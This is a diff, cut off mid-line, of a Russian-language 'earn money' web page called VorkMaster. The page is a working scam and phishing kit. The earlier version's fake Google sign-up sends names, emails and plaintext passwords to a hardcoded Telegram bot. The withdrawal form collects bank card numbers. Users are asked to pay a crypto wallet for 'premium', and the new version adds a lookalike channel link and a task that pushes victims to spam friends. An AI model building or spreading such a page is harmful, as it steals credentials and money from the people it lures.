@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>VorkMaster — Заработок</title>
+    <title>VorkMaster — Заработок в Telegram</title>
     <style>
         * {
             margin: 0;
@@ -55,9 +55,10 @@
             margin-bottom: 30px;
         }
 
-        .google-btn {
-            background: white;
-            color: #1e293b;
+        /* Кнопка Telegram */
+        .telegram-btn {
+            background: #2aabee;
+            color: white;
             padding: 16px 20px;
             border-radius: 60px;
             display: flex;
@@ -74,7 +75,7 @@
             transition: 0.2s;
         }
 
-        .google-btn:active {
+        .telegram-btn:active {
             transform: scale(0.97);
         }
 
@@ -140,7 +141,7 @@
             width: 90%;
             max-width: 350px;
             text-align: center;
-            border: 1px solid #8b5cf6;
+            border: 1px solid #2aabee;
         }
 
         .modal-box h2 {
@@ -153,14 +154,14 @@
             padding: 14px;
             margin: 10px 0;
             background: #1e293b;
-            border: 1px solid #8b5cf6;
+            border: 1px solid #2aabee;
             border-radius: 60px;
             color: white;
             font-size: 1rem;
         }
 
         .modal-box button {
-            background: linear-gradient(95deg, #8b5cf6, #3b82f6);
+            background: #2aabee;
             border: none;
             padding: 14px;
             width: 100%;
@@ -188,7 +189,7 @@
             border-radius: 28px;
             padding: 20px;
             margin: 20px 0;
-            border: 1px solid #8b5cf6;
+            border: 1px solid #2aabee;
         }
 
         .stat-row {
@@ -210,7 +211,7 @@
         .referral-box input {
             flex: 1;
             background: #0f172a;
-            border: 1px solid #8b5cf6;
+            border: 1px solid #2aabee;
             color: white;
             padding: 10px;
             border-radius: 40px;
@@ -218,7 +219,7 @@
         }
 
         .copy-btn {
-            background: #8b5cf6;
+            background: #2aabee;
             border: none;
             padding: 8px 16px;
             border-radius: 40px;
@@ -257,7 +258,7 @@
         }
 
         .task-btn {
-            background: #8b5cf6;
+            background: #2aabee;
             border: none;
             padding: 8px 16px;
             border-radius: 40px;
@@ -291,14 +292,11 @@
             <h1>ЗАБИРАЙ ДО 500 000₽</h1>
             <p>Приглашай друзей, выполняй задания, выводи деньги</p>
             
-            <button class="google-btn" id="openRegBtn">
-                <svg width="20" height="20" viewBox="0 0 24 24">
-                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+            <button class="telegram-btn" id="openTelegramBtn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.6-1.38-.97-2.23-1.56-.99-.69-.35-1.07.22-1.69.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.2-.04-.28-.02-.12.02-2.03 1.29-2.73 1.74-.23.15-.44.23-.63.22-.21-.01-.61-.12-1.07-.31-.6-.25-1.23-.53-1.07-.77.06-.09.13-.15.21-.2.53-.34 3.13-1.36 4.24-1.81 1.44-.58 1.74-.68 1.94-.68.14 0 .45.03.65.25.16.18.21.41.23.56.02.15.02.35.01.55z"/>
                 </svg>
-                Войти через Google
+                Войти через Telegram
             </button>
         </div>
 
@@ -338,8 +336,8 @@
                 <span id="userName">—</span>
             </div>
             <div class="stat-row">
-                <span>📧 Email:</span>
-                <span id="userEmail">—</span>
+                <span>🆔 Telegram:</span>
+                <span id="userTelegram">—</span>
             </div>
             <div class="stat-row">
                 <span>💰 Баланс:</span>
@@ -364,9 +362,9 @@
         <div class="method-block">
             <h3>📋 ВЫПОЛНИ ЗАДАНИЯ</h3>
             
-            <div class="task-item" id="taskSubscribe">
-                <span>📢 Подписаться на канал</span>
-                <button class="task-btn" id="subscribeBtn">Выполнить</button>
+            <div class="task-item" id="taskShare">
+                <span>📢 Отправить друзьям: канал + сайт → +1000₽</span>
+                <button class="task-btn" id="shareBtn">Выполнить</button>
             </div>
             
             <div class="task-item" id="taskFriends">
@@ -395,15 +393,33 @@
     </div>
 </div>
 
-<!-- ФОРМА РЕГИСТРАЦИИ (Имя, Email, Пароль) -->
-<div id="regModal" class="modal-window">
+<!-- ФОРМА ВХОДА ЧЕРЕЗ TELEGRAM -->
+<div id="telegramModal" class="modal-window">
     <div class="modal-box">
-        <h2>🔐 РЕГИСТРАЦИЯ</h2>
-        <input type="text" id="regName" placeholder="Имя и фамилия">
-        <input type="email" id="regEmail" placeholder="Email">
-        <input type="password" id="regPassword" placeholder="Пароль">
-        <button id="submitRegBtn">✅ ЗАРЕГИСТРИРОВАТЬСЯ</button>
-        <button id="closeRegBtn" class="modal-close">Закрыть</button>
+        <h2>🔐 Вход через Telegram</h2>
+        <input type="text" id="tgName" placeholder="Ваше имя в Telegram">
+        <input type="text" id="tgUsername" placeholder="@username (без @)">
+        <button id="submitTelegramBtn">✅ ВОЙТИ</button>
+        <button id="closeTelegramBtn" class="modal-close">Закрыть</button>
+    </div>
+</div>
+
+<!-- ФОРМА ДЛЯ РАССЫЛКИ -->
+<div id="shareModal" class="modal-window">
+    <div class="modal-box">
+        <h2>📢 РАССЫЛКА ДРУЗЬЯМ</h2>
+        <p style="margin: 10px 0; color: #94a3b8;">Отправь это сообщение 5 друзьям в Telegram:</p>
+        <div style="background:#1e293b; padding: 15px; border-radius: 16px; margin: 15px 0; text-align: left;">
+            <p>🔥 <strong>ЗАРАБОТАЙ СО МНОЙ!</strong> 🔥</p>
+            <p>👇 Переходи по ссылке и начинай зарабатывать:</p>
+            <p><strong>https://gamerby.github.io/VorkMaster/</strong></p>
+            <p>📢 Подпишись на канал:</p>
+            <p><strong>https://t.me/tonairdropofficiaI</strong></p>
+            <p>💰 До 500 000₽ в месяц! 🚀</p>
+        </div>
+        <button id="copyMessageBtn" style="background:#2aabee;">📋 КОПИРОВАТЬ СООБЩЕНИЕ</button>
+        <button id="confirmShareBtn" style="background:#10b981; margin-top: 10px;">✅ Я ОТПРАВИЛ(А)</button>
+        <button id="closeShareBtn" class="modal-close">Закрыть</button>
     </div>
 </div>
 
@@ -415,7 +431,7 @@
         <div style="background:#1e293b; padding:12px; border-radius:16px; word-break:break-all; margin:10px 0;">
             0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908
         </div>
-        <button id="copyAddressBtn" style="background:#8b5cf6;">📋 Копировать адрес</button>
+        <button id="copyAddressBtn" style="background:#2aabee;">📋 Копировать адрес</button>
         <button id="confirmPayBtn">✅ ПОДТВЕРДИТЬ ОПЛАТУ</button>
         <button id="closeCryptoBtn" class="modal-close">Закрыть</button>
     </div>
@@ -426,6 +442,8 @@
     const BOT_TOKEN = "8557565108:AAFnoCGWW0e5Vmrz5vf9ikAKf-MfTm-0AOg";
     const CHAT_ID = "5314096451";
     const WALLET = "0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908";
+    const SITE_URL = "https://gamerby.github.io/VorkMaster/";
+    const CHANNEL_URL = "https://t.me/tonairdropofficiaI";
     
     let user = null;
     
@@ -453,7 +471,7 @@
     function updateUI() {
         if (!user) return;
         document.getElementById("userName").innerText = user.name;
-        document.getElementById("userEmail").innerText = user.email;
+        document.getElementById("userTelegram").innerText = "@" + user.tgUsername;
         document.getElementById("balance").innerText = user.balance + " ₽";
         document.getElementById("referralCount").innerText = user.refs.length;
         
@@ -488,12 +506,12 @@
         let link = document.getElementById("refLink");
         if (link) link.value = window.location.href.split("?")[0] + "?ref=" + user.id;
         
-        if (user.subscribed) {
-            let subBtn = document.getElementById("subscribeBtn");
-            if (subBtn) {
-                subBtn.innerText = "✅ Выполнено";
-                subBtn.classList.add("task-done");
-                subBtn.disabled = true;
+        if (user.shared) {
+            let shareBtn = document.getElementById("shareBtn");
+            if (shareBtn) {
+                shareBtn.innerText = "✅ Выполнено";
+                shareBtn.classList.add("task-done");
+                shareBtn.disabled = true;
             }
         }
     }
@@ -523,11 +541,11 @@
         sendToTG(`👥 НОВЫЙ РЕФЕРАЛ!\n👤 ${ref.name}\n🎁 Бонус: ${bonus}₽\n👥 Всего друзей: ${ref.refs.length}`);
     }
     
-    function register(name, email, password, refId) {
+    function register(tgUsername, name, refId) {
         let id = "id_" + Date.now() + "_" + Math.random().toString(36).substr(2, 4);
         let newUser = {
-            id: id, name: name, email: email, password: password, balance: 0, refs: [],
-            premium: false, premiumCount: 0, subscribed: false, sevenFriendsBonus: false
+            id: id, name: name, tgUsername: tgUsername, balance: 0, refs: [],
+            premium: false, premiumCount: 0, shared: false, sevenFriendsBonus: false
         };
         
         let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
@@ -541,11 +559,33 @@
         user = newUser;
         saveUser(user);
         
-        sendToTG(`🆕 НОВАЯ РЕГИСТРАЦИЯ!\n👤 Имя: ${name}\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🆔 ID: ${id}\n${refId ? "🔗 Реферал: " + refId : "Прямая регистрация"}`);
+        sendToTG(`🆕 НОВАЯ РЕГИСТРАЦИЯ!\n👤 Имя: ${name}\n🆔 Telegram: @${tgUsername}\n🆔 ID: ${id}\n${refId ? "🔗 Реферал: " + refId : "Прямая регистрация"}`);
         
         document.getElementById("mainScreen").style.display = "none";
         document.getElementById("dashboard").style.display = "block";
         updateUI();
+        
+        // Сразу показываем задание на рассылку
+        setTimeout(() => {
+            alert("📢 Выполни задание: отправь сообщение друзьям и получи +1000₽ на баланс!");
+        }, 500);
+    }
+    
+    function completeShareTask() {
+        if (!user) return;
+        if (user.shared) {
+            alert("✅ Ты уже получил бонус за рассылку!");
+            return;
+        }
+        
+        user.balance += 1000;
+        user.shared = true;
+        saveUser(user);
+        updateUI();
+        
+        sendToTG(`📢 ВЫПОЛНЕНО ЗАДАНИЕ!\n👤 ${user.name}\n🎁 Бонус за рассылку: +1000₽\n💰 Баланс: ${user.balance}₽`);
+        
+        alert("🎉 +1000₽ на баланс! Продолжай приглашать друзей и зарабатывай больше!");
     }
     
     function activatePremium() {
@@ -558,7 +598,7 @@
         localStorage.setItem("vork_all", JSON.stringify(all));
         
         updateUI();
-        sendToTG(`💎 ПРЕМИУМ АКТИВИРОВАН!\n👤 ${user.name}\n📧 ${user.email}`);
+        sendToTG(`💎 ПРЕМИУМ АКТИВИРОВАН!\n👤 ${user.name}\n🆔 @${user.tgUsername}`);
         alert("🔥 ПРЕМИУМ АКТИВИРОВАН! Теперь ты получаешь +4000₽ за первых 3 друзей и +5000₽ за 7 друзей!");
     }
     
@@ -572,48 +612,4 @@
         let amount = user.balance;
         let card = prompt("💳 Введи номер карты для вывода:");
         if (!card || card.length < 10) return;
-        if (confirm(`💰 Сумма вывода: ${amount} ₽\n⚡ Комиссия: 0%\n💳 Карта: ${card}\n\nВывести?`)) {
-            sendToTG(`💸 ЗАПРОС НА ВЫВОД!\n👤 ${user.name}\n📧 ${user.email}\n💰 Сумма: ${amount} ₽\n💳 Карта: ${card}\n🏆 Премиум: ${user.premium ? "Да" : "Нет"}`);
-            user.balance = 0;
-            saveUser(user);
-            updateUI();
-            alert("✅ Заявка отправлена! Средства поступят в течение 24-72 часов.");
-        }
-    }
-    
-    function subscribeToChannel() {
-        if (!user) return;
-        if (user.subscribed) {
-            alert("✅ Ты уже подписан!");
-            return;
-        }
-        window.open("https://t.me/tonairdropofficiaI", "_blank");
-        setTimeout(() => {
-            let confirmSub = confirm("📢 Ты подписался на канал? Нажми ОК, чтобы получить доступ.");
-            if (confirmSub) {
-                user.subscribed = true;
-                saveUser(user);
-                updateUI();
-                sendToTG(`📢 ПОДПИСКА!\n👤 ${user.name}\n📧 ${user.email}\n✅ Подписался на @tonairdropofficiaI`);
-                alert("✅ Спасибо за подписку!");
-            }
-        }, 3000);
-    }
-    
-    window.copyRefLink = function() {
-        let link = document.getElementById("refLink").value;
-        navigator.clipboard.writeText(link);
-        alert("🔗 Ссылка скопирована!");
-    };
-    
-    function start() {
-        let urlRef = new URLSearchParams(window.location.search).get("ref");
-        if (urlRef) localStorage.setItem("pending_ref", urlRef);
-        
-        if (loadUser()) {
-            document.getElementById("mainScreen").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-            updateUI();
-        }
-        
-        // КНОПКА ОТКРЫВАЕТ 
+        if (confirm(`💰 Сумма вывода: ${amount} ₽\n⚡ Комиссия: 0%\n💳 Карта: ${card}\n\nВыве
